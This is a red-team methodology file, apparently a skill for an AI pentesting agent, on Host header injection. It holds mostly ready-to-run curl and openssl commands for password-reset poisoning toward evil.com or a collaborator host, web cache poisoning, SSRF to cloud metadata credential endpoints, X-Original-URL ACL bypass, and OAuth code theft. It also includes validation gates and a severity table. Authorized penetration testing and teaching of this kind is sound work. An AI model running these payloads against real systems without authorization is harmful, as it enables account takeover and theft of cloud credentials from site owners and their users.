---
name: Host Header Injection
description: Exploit attacker-controlled Host / X-Forwarded-Host for password-reset poisoning to ATO, web cache poisoning, routing-based SSRF to cloud metadata, path-override ACL bypass, and OAuth/OIDC redirect poisoning.
tags: [host-header, cache-poisoning, ssrf, account-takeover, oauth, password-reset]
recommended_tools: [http_request, http_repeater, http_intruder, curl, nuclei_scan, ffuf_scan, python3]
vuln_classes: []
domain: web
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-host-header/SKILL.md]}
---

# Host Header Injection

Host header injection abuses the fact that many frameworks and proxies trust the client-supplied
`Host` (or `X-Forwarded-Host`, `X-Host`, `Forwarded`) when building absolute URLs, selecting an
upstream, or overriding the routed path. Depending on where the trust lives it becomes password
reset poisoning (ATO), web cache poisoning (mass XSS/redirect), routing-based SSRF (cloud metadata),
edge ACL bypass, or OAuth/OIDC redirect/issuer poisoning.

CWE-644 (Improper Neutralization of HTTP Headers), CWE-918 (SSRF), CWE-525 (web cache).

Always test against **your own** registered test account. Never request another user's password reset.

## Crown-jewel chains

- **Password reset poisoning → ATO** — server builds the reset link from the request Host. Attacker
  sets `Host: evil.com`; the victim's reset email points the token at the attacker, captured on click
  → full ATO. Pre-account-takeover variant: even the victim requesting their own reset leaks the
  token to `evil.com`. Root cause is frameworks that build the URL from `request.get_host()` with no
  `ALLOWED_HOSTS`-style allowlist (classic Django case).
- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects an
  attacker `X-Forwarded-Host` into an absolute URL (script `src`, `<link>`, redirect `Location`) →
  poisoned entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
- **Routing-based SSRF** — the front-end uses the Host header itself to pick the upstream;
  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request there → cloud
  metadata / internal admin panels.
- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` / `X-Rewrite-URL`
  to override the routed path → reach `/admin` or internal endpoints the edge ACL thought it blocked.
- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
  auth-code or token theft → ATO.

## Attack-surface signals

```
Any password reset / forgot-password / email-verification / invite endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)
OAuth/OIDC authorization + /.well-known/openid-configuration endpoints
Absolute URLs constructed from request Host (set-password links, share links, webhooks)
Email-sending endpoints (transactional mail, notifications)
Reverse proxies that route by Host (k8s ingress, service mesh, internal forward proxies)
```

Dangerous header candidates (unkeyed / trusted inputs):

```
Host                 X-Forwarded-Host      X-Host
X-Forwarded-Server   X-HTTP-Host-Override  Forwarded
X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)
X-Forwarded-Scheme
```

## Methodology

### Phase 1 — Password reset poisoning

```bash
# 1a. Override Host directly
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-test-account@target.com"}'

# 1b. X-Forwarded-Host (behind a reverse proxy that trusts it)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1c. X-Host / X-Forwarded-Server variants
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" -H "X-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1d. Dual-Host smuggling: some stacks read the SECOND Host header
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
  | openssl s_client -quiet -connect $TARGET:443 2>/dev/null

# 1e. Absolute-URL injection: keep real Host, append attacker host
#     so the reset link becomes https://TARGET.evil.com/...
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET.evil.com" -d "email=your-test-account@target.com"

# 1f. Trailing-port / userinfo confusion (parsers that split on : or @)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET:1@evil.com" -d "email=your-test-account@target.com"
```

**Proof:** open the reset email in your own test inbox and read the link host. The token must appear
under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator/OOB domain).
Inject a **Collaborator/OOB host** so that when the link is clicked or preview-fetched you capture the
token out-of-band — that inbound HTTP hit carrying the token is the strongest proof.

### Phase 2 — Web cache poisoning via Host / X-Forwarded-Host

This is a **reflection** bug, not an OOB bug. The injected host must be reflected into the response
body (absolute URL, script `src`, `<link href>`, `<base href>`, redirect `Location`, canonical /
og:url) **and** that response must be cached on a key you do not control. No callback is expected from
the cache test itself — only later, when a victim's browser loads the poisoned URL.

```bash
# 2a. Is the host reflected into the body?
curl -s https://$TARGET/ \
  -H "Host: $TARGET" -H "X-Forwarded-Host: canary-$RANDOM.example" \
  | grep -i "canary"

# 2b. Is the response cacheable, and what is the cache key?
curl -sI "https://$TARGET/?cb=$RANDOM" \
  | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"
#   Look for X-Cache/CF-Cache-Status: HIT, nonzero Age, Via: varnish/fastly/cloudfront.
#   If Vary does NOT include X-Forwarded-Host, the header is UNKEYED -> poisonable.

# 2c. Prove poisoning: poison once, then fetch CLEAN (no injected header) on the same key.
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null   # poison
curl -s "$URL" | grep -i "evilcdn.example"                        # clean view reflects payload -> POISONED
```

**False-positive killers (mandatory):**
- A reflection that only appears for your request (header is **keyed**, e.g. in `Vary`, or the CDN
  includes Host in the key) is **not** poisoning — 2c must return the payload on a request that omits
  the header.
- `Age: 0` + `MISS` every time → no shared cache → no mass impact. Demote to self-only / Low.
- Confirm blast radius from a second machine / fresh egress IP / incognito before claiming "mass".
  Cache scope is often per-edge / per-cookie / per-geo.

### Phase 3 — SSRF via Host header (two distinct mechanisms — do not conflate)

These operate at different layers. Test them separately; they do not compose into one request.

**(3A) Routing-based SSRF — the Host header selects the upstream.** The path goes on the request line,
exactly as a normal request, because the metadata service / internal host serves plain HTTP and only
sees the request line + headers you forward. `X-Original-URL` is irrelevant here — EC2 IMDS ignores it.

```bash
# Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"

# GCP / Azure equivalents (still routing via Host):
curl -s "https://$TARGET/computeMetadata/v1/" \
  -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
  -H "Host: 169.254.169.254" -H "Metadata: true"

# Internal hostname / port routing:
curl -s "https://$TARGET/" -H "Host: localhost:6379"                    # Redis behind the proxy
curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"

# Blind / no reflection? Point Host at a Collaborator subdomain and watch for the proxy's
# outbound DNS/HTTP lookup — that proves the front-end resolves the attacker host.
curl -s "https://$TARGET/" -H "Host: $COLLAB"
```

**(3B) Path-override SSRF / ACL bypass — `X-Original-URL` / `X-Rewrite-URL`.** An IIS/ASP.NET/
Spring-Cloud-Gateway feature where the app overrides the routed path. The real Host stays put; you are
bypassing an **edge path ACL**, not steering an upstream.

```bash
# Reach an internal/blocked path the edge thought it denied. Real Host stays.
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"
# Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
```

> The naive probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` is wrong: those
> headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.

### Phase 4 — OAuth / OIDC / SAML poisoning

```bash
# Does the authorization endpoint build redirect_uri / display URL from Host?
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.com" | grep -iE "redirect|location|action="

# OIDC discovery: if issuer/endpoints reflect Host, the whole flow can be re-pointed.
curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
```

**Proof:** the auth code / token must actually be delivered to the attacker host (captured on your
OOB listener) — a reflected string alone is not ATO.

### Phase 5 — Header fuzzing

Burp **Param Miner → Guess headers** (or `http_intruder`) finds unkeyed / cache-affecting headers the
static list misses. Manual sweep:

```bash
HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \
  Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)
for H in "${HOST_HEADERS[@]}"; do
  echo "=== $H ==="
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.example" \
    | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

## Chain table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |

## Validation gates

- **Gate 0 — Password reset:** the token URL in your own test account's email uses an
  attacker-controlled host. Strongest proof = inject a Collaborator host and show the inbound HTTP hit
  carrying the token when the link is clicked/previewed (OOB capture).
- **Cache poison:** a request that omits the injected header (fresh egress IP / incognito) still
  returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
  `MISS`/`Age:0` only.
- **Routing SSRF:** real response body from `169.254.169.254` / internal host, or an OOB DNS/HTTP hit
  on your Collaborator from the front-end (blind case).
- **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
- **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured), not
  merely reflected.

**Rule out false positives:**
- Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A 200 echoing your Host string is not SSRF unless the response content came from the internal target
  or your Collaborator fired.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — a reflected header in the HTTP
  response does not guarantee a poisoned email; verify the email body.

## Severity

- Reset → ATO for any user: **Critical**
- Routing SSRF → cloud metadata creds (usable): **Critical** / High
- Cache poisoning → mass XSS/redirect (shared key proven): **High**
- Path-override → internal/admin reach: **High**
- Reflected only, uncacheable, not in email, no internal reach: **Low / informational**

## References

- PortSwigger Research, James Kettle — "Practical Web Cache Poisoning" (2018), "Web Cache
  Entanglement" (2020), "Cracking the Lens" (routing-based SSRF).
- Classic password-reset-poisoning class (framework `get_host()` without `ALLOWED_HOSTS` allowlist).

Cite the technique source and the exact behaviour you reproduced (reflected header, cache HIT on a
fresh key, OOB hit). Never copy a CVE or report ID you have not verified.
